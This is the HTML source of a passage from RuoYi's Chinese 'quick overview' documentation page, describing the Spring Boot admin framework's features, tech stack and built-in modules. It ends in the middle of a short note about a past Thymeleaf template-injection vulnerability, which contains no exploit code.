<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>快速了解 | RuoYi</title>
    <meta name="generator" content="VuePress 1.8.3">
    <link rel="icon" href="/ruoyi-doc/images/favicon.ico">
    <link rel="stylesheet" href="/ruoyi-doc/css/ruoyi.css">
    <script charset="utf-8" src="/ruoyi-doc/js/ruoyi.js"></script>
    <meta name="description" content="使用若依快速构建web应用程序">
    
    <link rel="preload" href="/ruoyi-doc/assets/css/0.styles.ae533190.css" as="style"><link rel="preload" href="/ruoyi-doc/assets/js/app.5798b861.js" as="script"><link rel="preload" href="/ruoyi-doc/assets/js/2.f516d180.js" as="script"><link rel="preload" href="/ruoyi-doc/assets/js/52.cd359cac.js" as="script"><link rel="prefetch" href="/ruoyi-doc/assets/js/10.0248f71a.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/11.fc0e17fd.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/12.68d838a7.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/13.f737d3b0.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/14.70c653e1.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/15.310a9ece.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/16.9821d487.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/17.653ea442.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/18.18e82341.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/19.1fac1e6e.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/20.e2c3c64e.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/21.8b85136f.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/22.678e089b.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/23.e608d9bf.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/24.3df80953.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/25.507dd64b.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/26.8bdba289.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/27.8a33c77e.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/28.75d32cb0.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/29.4061f780.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/3.ca16bf72.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/30.db44ab7a.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/31.dbe804cd.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/32.47e3716d.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/33.16f0a214.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/34.5d74a881.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/35.f0d7b762.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/36.8225cd69.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/37.5973a610.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/38.656bb410.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/39.a2e2a07b.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/4.c986860c.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/40.33959f43.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/41.419a3df4.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/42.f264b8a3.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/43.32661f89.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/44.7dc6d629.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/45.7c7ad283.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/46.2b1ae7a3.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/47.de6db9a6.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/48.b1634da6.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/49.16608e00.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/5.88ad39ea.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/50.ecb19ef5.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/51.ab5d712a.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/53.f4945c78.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/54.eeff4486.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/55.441fd5f1.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/56.02c34881.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/57.fa8fdd4a.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/58.07c1fe99.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/59.bd953cc8.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/6.da8722b2.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/60.8fd6202f.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/7.6075b05b.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/8.c6b3de51.js"><link rel="prefetch" href="/ruoyi-doc/assets/js/9.afd4c5a1.js">
    <link rel="stylesheet" href="/ruoyi-doc/assets/css/0.styles.ae533190.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/ruoyi-doc/" class="home-link router-link-active"><!----> <span class="site-name">RuoYi</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/ruoyi-doc/ruoyi/" class="nav-link router-link-active">
  文档
</a></div><div class="nav-item"><a href="/ruoyi-doc/ruoyi-vue/" class="nav-link">
  分离版
</a></div><div class="nav-item"><a href="/ruoyi-doc/ruoyi-cloud/" class="nav-link">
  微服务版
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="生态系统" class="dropdown-title"><span class="title">生态系统</span> <span class="arrow down"></span></button> <button type="button" aria-label="生态系统" class="mobile-dropdown-title"><span class="title">生态系统</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
          项目
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://gitee.com/y_project/RuoYi" target="_blank" rel="noopener noreferrer" class="nav-link external">
  RuoYi
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://gitee.com/y_project/RuoYi-Vue" target="_blank" rel="noopener noreferrer" class="nav-link external">
  RuoYi-Vue
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://gitee.com/y_project/RuoYi-Cloud" target="_blank" rel="noopener noreferrer" class="nav-link external">
  RuoYi-Cloud
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li><li class="dropdown-item"><h4>
          扩展列表
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ruoyi-doc/ruoyi/document/xmkz.html" class="nav-link">
  RuoYi 项目扩展
</a></li><li class="dropdown-subitem"><a href="/ruoyi-doc/ruoyi-vue/document/xmkz.html" class="nav-link">
  RuoYi-Vue 项目扩展
</a></li><li class="dropdown-subitem"><a href="/ruoyi-doc/ruoyi-cloud/document/xmkz.html" class="nav-link">
  RuoYi-Cloud 项目扩展
</a></li></ul></li><li class="dropdown-item"><h4>
          帮助
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://gitee.com/y_project/RuoYi/issues" target="_blank" rel="noopener noreferrer" class="nav-link external">
  我要提问
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="/ruoyi-doc/ruoyi/other/faq.html" class="nav-link">
  常见问题
</a></li><li class="dropdown-subitem"><a href="https://jq.qq.com/?_wv=1027&amp;k=1sNsfWzD" target="_blank" rel="noopener noreferrer" class="nav-link external">
  加入QQ群
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></div></div><div class="nav-item"><a href="https://github.com/yangzongzhuan/RuoYi" target="_blank" rel="noopener noreferrer" class="nav-link external">
  GitHub
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://gitee.com/y_project/RuoYi" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Gitee
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/ruoyi-doc/ruoyi/" class="nav-link router-link-active">
  文档
</a></div><div class="nav-item"><a href="/ruoyi-doc/ruoyi-vue/" class="nav-link">
  分离版
</a></div><div class="nav-item"><a href="/ruoyi-doc/ruoyi-cloud/" class="nav-link">
  微服务版
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="生态系统" class="dropdown-title"><span class="title">生态系统</span> <span class="arrow down"></span></button> <button type="button" aria-label="生态系统" class="mobile-dropdown-title"><span class="title">生态系统</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
          项目
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://gitee.com/y_project/RuoYi" target="_blank" rel="noopener noreferrer" class="nav-link external">
  RuoYi
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://gitee.com/y_project/RuoYi-Vue" target="_blank" rel="noopener noreferrer" class="nav-link external">
  RuoYi-Vue
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="https://gitee.com/y_project/RuoYi-Cloud" target="_blank" rel="noopener noreferrer" class="nav-link external">
  RuoYi-Cloud
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li><li class="dropdown-item"><h4>
          扩展列表
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ruoyi-doc/ruoyi/document/xmkz.html" class="nav-link">
  RuoYi 项目扩展
</a></li><li class="dropdown-subitem"><a href="/ruoyi-doc/ruoyi-vue/document/xmkz.html" class="nav-link">
  RuoYi-Vue 项目扩展
</a></li><li class="dropdown-subitem"><a href="/ruoyi-doc/ruoyi-cloud/document/xmkz.html" class="nav-link">
  RuoYi-Cloud 项目扩展
</a></li></ul></li><li class="dropdown-item"><h4>
          帮助
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://gitee.com/y_project/RuoYi/issues" target="_blank" rel="noopener noreferrer" class="nav-link external">
  我要提问
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-subitem"><a href="/ruoyi-doc/ruoyi/other/faq.html" class="nav-link">
  常见问题
</a></li><li class="dropdown-subitem"><a href="https://jq.qq.com/?_wv=1027&amp;k=1sNsfWzD" target="_blank" rel="noopener noreferrer" class="nav-link external">
  加入QQ群
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></div></div><div class="nav-item"><a href="https://github.com/yangzongzhuan/RuoYi" target="_blank" rel="noopener noreferrer" class="nav-link external">
  GitHub
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://gitee.com/y_project/RuoYi" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Gitee
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>文档</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/ruoyi-doc/ruoyi/" aria-current="page" class="sidebar-link">介绍</a></li><li><a href="/ruoyi-doc/ruoyi/document/kslj.html" aria-current="page" class="active sidebar-link">快速了解</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/ruoyi-doc/ruoyi/document/kslj.html#项目简介" class="sidebar-link">项目简介</a></li><li class="sidebar-sub-header"><a href="/ruoyi-doc/ruoyi/document/kslj.html#主要特性" class="sidebar-link">主要特性</a></li><li class="sidebar-sub-header"><a href="/ruoyi-doc/ruoyi/document/kslj.html#技术选型" class="sidebar-link">技术选型</a></li><li class="sidebar-sub-header"><a href="/ruoyi-doc/ruoyi/document/kslj.html#内置功能" class="sidebar-link">内置功能</a></li><li class="sidebar-sub-header"><a href="/ruoyi-doc/ruoyi/document/kslj.html#历史漏洞" class="sidebar-link">历史漏洞</a></li></ul></li><li><a href="/ruoyi-doc/ruoyi/document/hjbs.html" class="sidebar-link">环境部署</a></li><li><a href="/ruoyi-doc/ruoyi/document/xmjs.html" class="sidebar-link">项目介绍</a></li><li><a href="/ruoyi-doc/ruoyi/document/htsc.html" class="sidebar-link">后台手册</a></li><li><a href="/ruoyi-doc/ruoyi/document/qdsc.html" class="sidebar-link">前端手册</a></li><li><a href="/ruoyi-doc/ruoyi/document/gnzj.html" class="sidebar-link">功能组件</a></li><li><a href="/ruoyi-doc/ruoyi/document/mbyq.html" class="sidebar-link">模板引擎</a></li><li><a href="/ruoyi-doc/ruoyi/document/zjwd.html" class="sidebar-link">组件文档</a></li><li><a href="/ruoyi-doc/ruoyi/document/cjjc.html" class="sidebar-link">插件集成</a></li><li><a href="/ruoyi-doc/ruoyi/document/xmkz.html" class="sidebar-link">项目扩展</a></li><li><a href="/ruoyi-doc/ruoyi/document/spjc.html" class="sidebar-link">视频教程</a></li><li><a href="/ruoyi-doc/ruoyi/document/gxrz.html" class="sidebar-link">更新日志</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>其它</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/ruoyi-doc/ruoyi/other/faq.html" class="sidebar-link">常见问题</a></li><li><a href="/ruoyi-doc/ruoyi/other/donate.html" class="sidebar-link">捐赠支持</a></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="快速了解"><a href="#快速了解" class="header-anchor">#</a> 快速了解</h1> <h2 id="项目简介"><a href="#项目简介" class="header-anchor">#</a> 项目简介</h2> <p>RuoYi是一款基于SpringBoot+Bootstrap的极速后台开发框架。</p> <ul><li>RuoYi 官网地址：<a href="http://ruoyi.vip" target="_blank" rel="noopener noreferrer">http://ruoyi.vip<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>RuoYi 在线文档：<a href="http://doc.ruoyi.vip" target="_blank" rel="noopener noreferrer">http://doc.ruoyi.vip<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>RuoYi 源码下载：<a href="https://gitee.com/y_project/RuoYi" target="_blank" rel="noopener noreferrer">https://gitee.com/y_project/RuoYi<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>RuoYi 在线提问：<a href="https://gitee.com/y_project/RuoYi/issues" target="_blank" rel="noopener noreferrer">https://gitee.com/y_project/RuoYi/issues<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>RuoYi 博客：<a href="https://www.oschina.net/p/ruoyi" target="_blank" rel="noopener noreferrer">https://www.oschina.net/p/ruoyi<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>QQ 群号： 1389287、1679294、1529866、1772718、1366522、1382251、1145125、86752435、134072510、210336300、339522636、130035985、143151071、158781320、201531282、101526938</li></ul> <p>RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。在线定时任务配置；支持集群，支持多数据源，支持分布式事务。</p> <h2 id="主要特性"><a href="#主要特性" class="header-anchor">#</a> 主要特性</h2> <ul><li>完全响应式布局（支持电脑、平板、手机等所有主流设备）</li> <li>强大的一键生成功能（包括控制器、模型、视图、菜单等）</li> <li>支持多数据源，简单配置即可实现切换。</li> <li>支持按钮及数据权限，可自定义部门数据权限。</li> <li>对常用js插件进行二次封装，使js代码变得简洁，更加易维护</li> <li>完善的XSS防范及脚本过滤，彻底杜绝XSS攻击</li> <li>Maven多项目依赖，模块及插件分项目，尽量松耦合，方便模块升级、增减模块。</li> <li>国际化支持，服务端及客户端支持</li> <li>完善的日志记录体系简单注解即可实现</li> <li>支持服务监控，数据监控，缓存监控功能。</li></ul> <h2 id="技术选型"><a href="#技术选型" class="header-anchor">#</a> 技术选型</h2> <p><strong>1、系统环境</strong></p> <ul><li>Java EE 8</li> <li>Servlet 3.0</li> <li>Apache Maven 3</li></ul> <p><strong>2、主框架</strong></p> <ul><li>Spring Boot 2.2.x</li> <li>Spring Framework 5.2.x</li> <li>Apache Shiro 1.7</li></ul> <p><strong>3、持久层</strong></p> <ul><li>Apache MyBatis 3.5.x</li> <li>Hibernate Validation 6.0.x</li> <li>Alibaba Druid 1.2.x</li></ul> <p><strong>4、视图层</strong></p> <ul><li>Bootstrap 3.3.7</li> <li>Thymeleaf 3.0.x</li></ul> <h2 id="内置功能"><a href="#内置功能" class="header-anchor">#</a> 内置功能</h2> <ul><li>用户管理：用户是系统操作者，该功能主要完成系统用户配置。</li> <li>部门管理：配置系统组织机构（公司、部门、小组），树结构展现支持数据权限。</li> <li>岗位管理：配置系统用户所属担任职务。</li> <li>菜单管理：配置系统菜单，操作权限，按钮权限标识等。</li> <li>角色管理：角色菜单权限分配、设置角色按机构进行数据范围权限划分。</li> <li>字典管理：对系统中经常使用的一些较为固定的数据进行维护。</li> <li>参数管理：对系统动态配置常用参数。</li> <li>通知公告：系统通知公告信息发布维护。</li> <li>操作日志：系统正常操作日志记录和查询；系统异常信息日志记录和查询。</li> <li>登录日志：系统登录日志记录查询包含登录异常。</li> <li>在线用户：当前系统中活跃用户状态监控。</li> <li>定时任务：在线（添加、修改、删除)任务调度包含执行结果日志。</li> <li>代码生成：前后端代码的生成（java、html、xml、sql)支持CRUD下载 。</li> <li>系统接口：根据业务代码自动生成相关的api接口文档。</li> <li>服务监控：监视当前系统CPU、内存、磁盘、堆栈等相关信息。</li> <li>缓存监控：对系统的缓存查询，查看、清理等操作。</li> <li>在线构建器：拖动表单元素生成相应的HTML代码。</li> <li>连接池监视：监视当期系统数据库连接池状态，可进行分析SQL找出系统性能瓶颈。</li></ul> <h2 id="历史漏洞"><a href="#历史漏洞" class="header-anchor">#</a> 历史漏洞</h2> <ul><li>存在系统安全漏洞 <code>RuoYi &lt;= v4.7.1</code></li></ul> <p>在<code>&lt;= thymeleaf-spring5:3.0.12</code>组件中，<code>thymeleaf</code>结合模板注入中的特定场景可能会导致远程代码执行。详细描述参见 <a 